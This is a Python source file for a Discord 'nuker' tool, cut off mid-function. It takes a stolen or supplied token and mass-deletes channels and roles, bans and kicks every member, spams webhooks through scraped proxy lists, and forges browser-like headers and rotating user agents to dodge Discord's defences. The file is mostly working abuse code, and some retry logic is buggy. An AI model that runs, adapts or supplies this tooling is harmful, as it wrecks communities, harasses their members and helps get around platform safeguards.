import requests
import json
import pathlib 
import time
import websocket
import base64
import random
import os
import socket
import colorama
import sys
import pypresence
import threading
import humanize
import hashlib
import base64
import validators

lock = threading.Lock()

from concurrent.futures import ThreadPoolExecutor

colorama.init(autoreset=True)

class Colour:

    YELLOW = colorama.Fore.YELLOW
    CYAN = colorama.Fore.CYAN
    WHITE = colorama.Fore.WHITE
    RED = colorama.Fore.RED
    GREEN = colorama.Fore.GREEN
    MAGENTA = colorama.Fore.MAGENTA

    BRIGHT = colorama.Style.BRIGHT

class URL:

    Github = "https://github.com/reactxsw"
    Repository = "https://github.com/reactxsw/react-nuker/blob/main/main.py"
    RAW_main_py = "https://raw.githubusercontent.com/reactxsw/react-nuker/main/main.py"
    RAW_config_json = "https://raw.githubusercontent.com/reactxsw/react-nuker/main/config.json"

    DiscordWebsocket = "wss://gateway.discord.gg/?v=9&encoding=json"
    BaseURL = "https://discord.com/api/v9/"
    WebhookURL = "https://discord.com/api/webhooks/"
    Proxy = {
        "ProxyUrls": {
            "ProxyScrape-Https": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=https",
            "ProxyScrape-Http": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=http",
            "ProxyScrape-Socks4": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=socks4",
            "ProxyScrape-Socks5": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=socks5",
            "ProxyScrape-All": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=all",
            "TheSpeedX-Socks5": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "TheSpeedX-Socks4": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "TheSpeedX-Http": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "ShiftyTR-Http": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "ShiftyTR-Https": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
            "ShiftyTR-All": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
            "ShiftyTR-Socks4": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
            "ShiftyTR-Socks5": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "Sunny9577-All": "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "Hookzof-All": "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "Clarketm-All": "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
        }
    }

class Update:

    def CheckUpdate(Check):
        if Check is True:

            with open(__file__, "r", encoding="utf8") as f:
                file = f.read()
            urlcode = requests.get(URL.RAW_main_py).text
            urlhash = hashlib.sha256((urlcode).encode('utf-8')).hexdigest()

            if hashlib.sha256((file).encode('utf-8')).hexdigest() != urlhash:
                print("                   There is an update availble. Do you want to Update ? ")
                return "UPDATE" ,input("                   [ Y / N ] ")

            else:
                return "UPTODATE", ""
        
        else:
            pass

    def UpdateProgram(self):
        print("ajajaj")


class Infomation:

    def __init__(self):
        self.Author = "REACT#1120"
        self.__VERSION__ = "1.3.0"
        self.Github = URL.Github
        self.Repository = URL.Repository

class Status:

    SuccessStatus = [200,201,204]

    def Fail(Text):
        
        lock.acquire()
        print(f"                   {Colour.BRIGHT}{Colour.RED}[{Colour.WHITE}FAIL{Colour.RED}] {Text}")
        lock.release()

    def Success(Text):
        lock.acquire()
        print(f"                   {Colour.BRIGHT}{Colour.GREEN}[{Colour.WHITE}SUCCESS{Colour.GREEN}] {Text}")
        lock.release()
    
    def Ratelimit(Text):
        lock.acquire()
        print(f"                   {Colour.BRIGHT}{Colour.MAGENTA}[{Colour.WHITE}RATELIMIT{Colour.MAGENTA}] {Text}")
        lock.release()

class Constant:
    CheckForUpdate = True
    RPC = False
    Blank = "_____________________________________"
    if pathlib.Path("config.json").exists():
        START = True
        with open('config.json') as setting:
            config = json.load(setting)
        
        SERVER_ID = config.get("SERVER_ID")
        TOKEN = config.get("TOKEN")
        INVITE_CODE = config.get("INVITE_CODE")

        if SERVER_ID == Blank:
            SERVER_ID = False
        
        if TOKEN == Blank:
            TOKEN = False
        
        if INVITE_CODE == Blank:
            INVITE_CODE = False
        
    else:
        START=False
        with open("config.json", "w") as setting:
            setting.writelines(
                [
                    "{",
                        "\n"
                        "    "+f'"SERVER_ID": "{Blank}",',
                        "\n",
                        "    "+f'"TOKEN": "{Blank}",',
                        "\n",
                        "    "+f'"INVITE_CODE": "{Blank}"',
                        "\n",
                    "}"
                ]
            )
    
    VOICE_ID = "873904278346010734"
    CLIENT_ID = "794921074768216126"
    LARGE_IMAGE = "smilewinlogo"
    IP_ADDR = socket.gethostbyname(socket.gethostname())
    os.system("title Disocrd Nuker BY REACT#1120")


    if pathlib.Path("tokens.txt").exists():
        with open("tokens.txt") as f:
            TOKENS = [x.strip() for x in f.readlines()] 
    else:
        file = open("tokens.txt", "w") 

class ProxyIP:
    ProxyURL = URL.Proxy["ProxyUrls"].items()
    def GetProxies():
        ProxyList = []
        #ProxyFile = "Proxy.txt"

        URL = 0 
        HTTP = 0
        HTTPS = 0
        SOCKS4 = 0
        SOCKS5 = 0

        for Provider, Url in ProxyIP.ProxyURL:
            Proxies = requests.get(Url).text.split("\n")
            URL = URL +1 

            for Proxy in Proxies:
                Proxy = Proxy.strip()

                if Proxy not in ProxyList:
                    Type = Provider.split("-")[1]

                    if Type == "Http":
                        ProxyList.append(f"http://{Proxy}")
                        HTTP = HTTP + 1 
                    
                    elif Type == "Https":
                        ProxyList.append(f"https://{Proxy}")
                        HTTPS = HTTPS + 1 
                    
                    elif Type == "Socks4":
                        ProxyList.append(f"socks4://{Proxy}")
                        SOCKS4 = SOCKS4 + 1 
                    
                    elif Type == "Socks5":
                        ProxyList.append(f"socks5://{Proxy}")
                        SOCKS5 = SOCKS5 + 1 
                    
                    else:
                        pass

        print(f"""
                   {humanize.intcomma(len(ProxyList))} Proxies was scraped from {URL} urls 
                   {humanize.intcomma(HTTP)} HTTP 
                   {humanize.intcomma(HTTPS)} HTTPS 
                   {humanize.intcomma(SOCKS4)} socks4 
                   {humanize.intcomma(SOCKS5)} socks5""")
        
        return ProxyList

class Function:

    def Credit():
        print(Infomation().Author)
        print(Infomation().__VERSION__)
        print(Infomation().Github)

    def DiscordRPC():
        if Constant.RPC is True:
            RPC = pypresence.Presence(Constant.CLIENT_ID)  
            RPC.connect() 
            RPC.update(state="Hacking",details="Smilewin discord server", join="https discord.gg/3UJFaRvJRC" ,large_image=Constant.LARGE_IMAGE,start=time.time())
        
        else:
            pass
        
    def CheckInternet():
        try:
            host = socket.gethostbyname("1.1.1.1")
            s = socket.create_connection((host, 80), 2)
            s.close()
            return True 
        except:
            pass
        return False
    
    def Clear():
        os.system("cls" if os.name == "nt" else "clear")
    
    def Spinner():
        l = ['|', '/', '-', '\\']
        for i in l*3:
            sys.stdout.write('\r'f"{Colour.BRIGHT}{Colour.YELLOW}Loading... {i}")
            sys.stdout.flush()
            time.sleep(0.075)

    def Menu():
        print(f"""{Colour.CYAN}                 
                                            ____  _____    _    ____ _____ 
                                           |  _ \| ____|  / \  / ___|_   _|
                                           | |_) |  _|   / _ \| |     | |  
                                           |  _ <| |___ / ___ \ |___  | | By. REACT#1120 
                                           |_| \_\_____/_/   \_\____| |_| {Colour.YELLOW}V. {Infomation().__VERSION__}\n""")
        print(f"{Colour.YELLOW}                   ╔═════════════════════╦═════════════════════╦═════════════════════╦═════════════════════╗")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}1{Colour.CYAN}] {Main.FunctionDict[1][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[1][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}9{Colour.CYAN}] {Main.FunctionDict[9][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[9][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}17{Colour.CYAN}]{Main.FunctionDict[17][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[17][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}25{Colour.CYAN}]{Main.FunctionDict[25][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[25][1])))}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}2{Colour.CYAN}] {Main.FunctionDict[2][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[2][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}10{Colour.CYAN}]{Main.FunctionDict[10][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[10][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}18{Colour.CYAN}]{Main.FunctionDict[18][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[18][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}26{Colour.CYAN}]{Main.FunctionDict[26][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[26][1])))}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}3{Colour.CYAN}] {Main.FunctionDict[3][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[3][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}11{Colour.CYAN}]{Main.FunctionDict[11][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[11][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}19{Colour.CYAN}]{Main.FunctionDict[19][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[19][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}27{Colour.CYAN}]{Main.FunctionDict[27][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[27][1])))}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}4{Colour.CYAN}] {Main.FunctionDict[4][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[4][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}12{Colour.CYAN}]{Main.FunctionDict[12][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[12][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}20{Colour.CYAN}]{Main.FunctionDict[20][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[20][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}28{Colour.CYAN}]{Main.FunctionDict[28][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[28][1])))}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}5{Colour.CYAN}] {Main.FunctionDict[5][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[5][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}13{Colour.CYAN}]{Main.FunctionDict[13][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[13][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}21{Colour.CYAN}]{Main.FunctionDict[21][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[21][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}29{Colour.CYAN}]{Main.FunctionDict[29][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[29][1])))}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}6{Colour.CYAN}] {Main.FunctionDict[6][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[6][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}14{Colour.CYAN}]{Main.FunctionDict[14][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[14][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}22{Colour.CYAN}]{Main.FunctionDict[22][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[22][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}30{Colour.CYAN}]{Main.FunctionDict[30][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[30][1])))}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}7{Colour.CYAN}] {Main.FunctionDict[7][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[7][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}15{Colour.CYAN}]{Main.FunctionDict[15][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[15][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}23{Colour.CYAN}]{Main.FunctionDict[23][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[23][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}31{Colour.CYAN}]{Main.FunctionDict[31][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[31][1])))}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}8{Colour.CYAN}] {Main.FunctionDict[8][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[8][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}16{Colour.CYAN}]{Main.FunctionDict[16][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[16][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}24{Colour.CYAN}]{Main.FunctionDict[24][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[24][1])))}"\
                                                f"║{Colour.CYAN} [{Colour.WHITE}32{Colour.CYAN}]{Colour.RED}{Main.FunctionDict[32][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[32][1])))}║")
        print(f"{Colour.YELLOW}                   ╚═════════════════════╩═════════════════════╩═════════════════════╩═════════════════════╝")

class ReqHeader:

    def UserAgent():
        
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Linux i686; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.31"
            ])

    def DiscordHeader():
        UA = ReqHeader.UserAgent()
        if requests.get(f"{URL.BaseURL}users/@me", headers={"Authorization": Constant.TOKEN}).status_code == 200:
            return {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "authorization": f"{Constant.TOKEN}",
                "user-agent": f"{UA}",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": base64.b64encode(str({
                        "os": "Windows",
                        "browser": "Chrome",
                        "device": "",
                        "system_locale": "en-US",
                        "browser_user_agent": f"{UA}",
                        "browser_version": "91.0.4472.101",
                        "os_version": "10",
                        "referrer": f"https://discord.com/register",
                        "referring_domain": "",
                        "referrer_current": "",
                        "referring_domain_current": "",
                        "release_channel": "stable",
                        "client_build_number": 87598,
                        "client_event_source": None
                    }).encode()).decode()
                }
        else:
            return {
                "Authorization": f"Bot {Constant.TOKEN}"
                }

class Data:

    def GetChannel_ID():
        if Constant.TOKEN is True:
            channel_id = [] 
            channels = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers= ReqHeader.DiscordHeader()).json()
            for i in range(len(channels)):
                channel_id.append(channels[i]["id"])

            return channel_id
        
        else:
            pass
    
    def GetRole_ID():
        if Constant.TOKEN is True:
            role_id = []
            roles = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles", headers= ReqHeader.DiscordHeader()).json()
            for i in range(len(roles)):
                role_id.append(roles[i]["id"])

            return role_id

        else:
            pass

    def GetMember_ID():
        if Constant.TOKEN is True:
            member_id = []
            members = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/members?limit=1000", headers= ReqHeader.DiscordHeader()).json()
            for i in range(len(members)):
                member_id.append(members[i]["user"]["id"])

            return member_id
        
        else:
            pass
    

class Discord:

    def SendWebhook(Webhook_URL, Message,Proxy):
        try:
            response =  requests.post(Webhook_URL, headers={
                "content-type": "application/json",
                "user-agent": f"{ReqHeader.UserAgent()}"
                },
                    json={
                        "content" : Message,
                        "username" : "REACT",
                        "avatar_url": "https://avatars.githubusercontent.com/u/70201574?v=4"
                    },
                        proxies={
                            "http" : Proxy, "https" : Proxy
                            })

            if response.status_code in Status.SuccessStatus:
                Status.Success(f"MESSAGE SENT")
            
            else:
                Status.Fail(f"MESSAGE NOT SENT")

        except:
            pass
    
    def CreateRole(RoleName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles", headers=ReqHeader.DiscordHeader(), json={
            "name":RoleName
        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Role {RoleName}")

        elif response.status_code == 429:
            Status.Ratelimit(f"")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateChannel, args=(RoleName)).start()
        
        else:
            Status.Fail(f"Couldn't Create Channel {RoleName}")

    def DeleteRole(RoleID):
        response = requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles/{RoleID}", headers=ReqHeader.DiscordHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created role {RoleID}")
        
        elif response.status_code == 429:
            Status.Ratelimit(f"")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateChannel, args=(RoleID)).start()

        else:
            Status.Fail(f"Couldn't delete role {RoleID}")

    def ChangeRoleName(RoleID , RoleName):
        response = requests.patch(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles/{RoleID}", headers=ReqHeader.DiscordHeader(), json={
            "name": f"{RoleName}"
        })

        if response.status_code in Status.SuccessStatus:
            Status.Success(f"CHANNEL NAME CHANGED")
        
        elif response.status_code == 429:
            time.sleep(0.05)
            threading.Thread(target=Discord.ChangeChannelName,args=(RoleID,RoleName)).start()

        else:
            Status.Fail(f"CHANNEL NAME NOT CHANGED")

    def CreateChannel(ChannelName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers=ReqHeader.DiscordHeader(), json = {
            'name': ChannelName,
            'type': 0
        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Channel {ChannelName}")
        
        elif response.status_code == 429:
            Status.Ratelimit(f"")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateChannel, args=(ChannelName)).start()

        else:
            Status.Fail(f"Couldn't Create Channel {ChannelName}")


    def DeleteChannel(ChannelID):
        try:
            response = requests.delete(f"{URL.BaseURL}channels/{ChannelID}", headers=ReqHeader.DiscordHeader())
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Deleted Channel {ChannelID}")
            else:
                print(f"Couldn't Delete Channel {ChannelID}")
        except:
            pass
    
    def ChangeChannelName(Channel , ChannelName):
        response = requests.patch(f"{URL.BaseURL}channels/{Channel}", headers=ReqHeader.DiscordHeader(), json={
            "name": f"{ChannelName}"
        })

        if response.status_code in Status.SuccessStatus:
            Status.Success(f"CHANNEL NAME CHANGED")
        
        elif response.status_code == 429:
            time.sleep(0.05)
            threading.Thread(target=Discord.ChangeChannelName,args=(Channel)).start()

        else:
            Status.Fail(f"CHANNEL NAME NOT CHANGED")

    def CreateCategory(ChannelName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers=ReqHeader.DiscordHeader(), json = {
            "name": ChannelName,
            "type": 4,
            "permission_overwrites": []

        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Channel {ChannelName}")
        
        elif response.status_code == 429:
            Status.Ratelimit(f"")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateChannel, args=(ChannelName)).start()

        else:
            Status.Fail(f"Couldn't Create Channel {ChannelName}")


    def DeleteCategory(ChannelID):
        try:
            response = requests.delete(f"{URL.BaseURL}channels/{ChannelID}", headers=ReqHeader.DiscordHeader())
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Deleted Channel {ChannelID}")

            elif response.status_code == 429:
                Status.Ratelimit(f"")
                time.sleep(0.05)
                threading.Thread(target=Discord.CreateChannel, args=(ChannelID)).start()
            
            else:
                Status.Fail(f"Couldn't Delete Channel {ChannelID}")
        except:
            pass
    
    def ChangeCategoryName(Channel , ChannelName):
        response = requests.patch(f"{URL.BaseURL}channels/{Channel}", headers=ReqHeader.DiscordHeader(), json={
            "name": f"{ChannelName}"
        })

        if response.status_code in Status.SuccessStatus:
            Status.Success(f"CHANNEL NAME CHANGED")
        
        elif response.status_code == 429:
            time.sleep(0.05)
            threading.Thread(target=Discord.ChangeChannelName,args=(Channel)).start()

        else:
            Status.Fail(f"CHANNEL NAME NOT CHANGED")
    
    def CreateVoiceChannel(ChannelName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers=ReqHeader.DiscordHeader(), json = {
            "name": ChannelName,
            "type": 2,
            "permission_overwrites": []

        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Channel {ChannelName}")
        
        elif response.status_code == 429:
            Status.Ratelimit(f"")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateChannel, args=(ChannelName)).start()

        else:
            Status.Fail(f"Couldn't Create Channel {ChannelName}")


    def DeleteVoiceChannel(ChannelID):
        try:
            response = requests.delete(f"{URL.BaseURL}channels/{ChannelID}", headers=ReqHeader.DiscordHeader())
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Deleted Channel {ChannelID}")

            elif response.status_code == 429:
                Status.Ratelimit(f"")
                time.sleep(0.05)
                threading.Thread(target=Discord.CreateChannel, args=(ChannelID)).start()
            
            else:
                Status.Fail(f"Couldn't Delete Channel {ChannelID}")
        except:
            pass
    
    def ChangeVoiceName(Channel , ChannelName):
        response = requests.patch(f"{URL.BaseURL}channels/{Channel}", headers=ReqHeader.DiscordHeader(), json={
            "name": f"{ChannelName}"
        })

        if response.status_code in Status.SuccessStatus:
            Status.Success(f"CHANNEL NAME CHANGED")
        
        elif response.status_code == 429:
            time.sleep(0.05)
            threading.Thread(target=Discord.ChangeChannelName,args=(Channel)).start()

        else:
            Status.Fail(f"CHANNEL NAME NOT CHANGED")

    def Ban(Member):
        try:
            response = requests.put(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/bans/{Member}", headers=ReqHeader.DiscordHeader(), json = {
                'delete_message_days': '7',
                'reason': 'NUKE'
            })
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Banned {Member.strip()}")

            elif response.status_code == 429:
                time.sleep(0.05)
                threading.Thread(target=Discord.Ban, args=(Member)).start()
                
            else:
                Status.Fail(f"Failed to ban {Member.strip()}")

        except:
            pass

    def Kick(Member):
        try:
            response = requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/members/{Member}", headers=ReqHeader.DiscordHeader(), json = {
                'delete_message_days': '7',
                'reason': 'NUKE'
            })
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"{Member.strip()}")

            elif response.status_code == 429:
                time.sleep(0.05)
                threading.Thread(target=Discord.Kick, args=(Member)).start()
            
            else:
                Status.Fail(f"{Member.strip()}")
                
        except:
            pass

    def CreateWebhook(Channel):
        response = requests.post(f"{URL.BaseURL}channels/{Channel}/webhooks", json={
            "name": "REACT"
            }, headers= ReqHeader.DiscordHeader())

        if response.status_code in Status.SuccessStatus:
            Status.Success(f"WEBHOOK CREATED")

        elif response.status_code == 429:
            threading.Thread(target=Discord.CreateWebhook,args=(Channel)).start()
        
        else:
            Status.Fail(f"WEBHOOK NOT CREATED")

    def Join(token):
        response = requests.post(f"{URL.BaseURL}invites/{Constant.INVITE_CODE}", headers= ReqHeader.DiscordHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"TOKEN : {token} JOINED")
        
        elif response.status_code == 429:
            threading.Thread(target=Discord.Join,args=(token)).start()

        else:
            Status.Fail(f"TOKEN : {token} NOT JOINED")

    def Leave(token):   
        response = requests.delete(f"{URL.BaseURL}users/@me/guilds/{Constant.SERVER_ID}", json={"lurking": "false"} , headers=ReqHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"TOKEN : {token} LEAVE")
        
        elif response.status_code == 429:
            threading.Thread(target=Discord.Leave,args=(token)).start()
        
        else:
            Status.Fail(f"TOKEN : {token} NOT LEAVE")

    def Connect(token,VOICE_ID):
        ws = websocket.WebSocket()
        ws.connect(URL.DiscordWebsocket)
        RECV = json.loads(ws.recv())
        heartbeat_interval = RECV['d']['heartbeat_interval']
        ws.send(json.dumps({
                    "op":2,
                    "d": {
                        "token":token, 
                        "properties": {
                            "$os":"windows",
                            "$browser":"Discord",
                            "$device": "desktop" 
                            }
                        }
                    }))
        ws.send(json.dumps({
                    "op":4,
                    "d": {
                        "guild_id":Constant.SERVER_ID, 
                        "channel_id": VOICE_ID,
                        "self_mute":True,
                        "self_deaf":True
                    }
                }))
        while True:
            time.sleep(heartbeat_interval/1000)
            try:
                ws.send(json.dumps({
                    "op":1,
                    "d":None}))
            except Exception:
                break

    def Online(token):
        ws = websocket.WebSocket()
        ws.connect(URL.DiscordWebsocket)
        RECV = json.loads(ws.recv())
        heartbeat_interval = RECV['d']['heartbeat_interval']
        while True:
            time.sleep(heartbeat_interval/1000)
            try:
                ws.send(json.dumps({
                    "op":1,
                    "d":None}))
            except Exception:
                break

    def Livestream(token, VOICE_ID):
        ws = websocket.WebSocket()
        ws.connect(URL.DiscordWebsocket)
        RECV = json.loads(ws.recv())
        heartbeat_interval = RECV['d']['heartbeat_interval']
        ws.send(json.dumps({
                    "op":2,
                    "d": {
                        "token":token, 
                        "properties": {
                            "$os":"windows",
                            "$browser":"Discord",
                            "$device": "desktop" 
                            }
                        }
                    }))
        ws.send(json.dumps({
                    "op":4,
                    "d": {
                        "guild_id":Constant.SERVER_ID, 
                        "channel_id": VOICE_ID,
                        "self_mute":True,
                        "self_deaf":True
                    }
                }))
        ws.send(json.dumps({
            "op":18,
            "d": {
                "type":"guild",
                "guild_id":Constant.SERVER_ID, 
                "channel_id": VOICE_ID,
                "preferred_region":"singapore"
                }
            }))
        while True:
            time.sleep(heartbeat_interval/1000)
            try:
                ws.send(json.dumps({
                    "op":1,
                    "d":None}))
            except Exception:
                break

class ThreadFunction:

    def Channel_ID():
        print(Data.GetChannel_ID())
    
    def Member_ID():
        print(Data.GetMember_ID())
    
    def Role_ID():
        print(Data.GetRole_ID())

    def ThreadChangeChannelName():
        Channels = Data.GetChannel_ID()
        
    def ThreadSpamWebhook(ProxyList):
        Threads =[] 
        while True:
            Webhook_url = input(f"{Colour.YELLOW}                        Webhook URL : ")
            if URL.WebhookURL in Webhook_url and requests.get(Webhook_url).status_code == 200 and validators.url(Webhook_url):
                break
                
            else:
                print("Invalid Webhook URL")

        Message = input(">")

        while True:
            try:
                for i in range(int(input(">"))):
                    Proxy = random.choice(ProxyList)
                    print(f"[{i}] {Proxy}")
                    t = threading.Thread(target=Discord.SendWebhook, args=(Webhook_url,Message,Proxy))
                    Threads.append(t)
                
                for Thread in Threads:
